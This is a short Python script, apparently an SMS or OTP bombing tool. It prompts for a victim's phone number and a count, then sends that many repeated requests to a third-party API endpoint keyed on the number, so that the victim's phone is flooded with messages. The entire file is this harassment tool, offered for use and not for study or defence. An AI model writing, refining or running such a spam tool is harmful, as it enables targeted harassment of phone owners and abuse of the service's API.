#!/usr/bin/python3
# -*- coding: utf-8 -*-

from requests import get
from terminaltables import AsciiTable
import threading

class Spam(threading.Thread):
  def __init__(self,target,count):
    threading.Thread.__init__(self)
    self.asu = 0
    self.target = target
    self.count = int(count)
    self.url = "https://api.masterkadal.com/tokotalk/{}".format(self.target)
  def run(self):
      while(self.asu < self.count):
        self.request = get(self.url)
        self.asu = self.asu+1
      self.tables = [
        ["TARGET","COUNT","STATUS"],
        [self.target,self.count,self.request.status_code]
      ]
      self.table = AsciiTable(self.tables)
      print(self.table.table)

if __name__=="__main__":
  target = input("[+] number phone : ")
  count = input("[+] count : ")
  Spam(target,count).start()
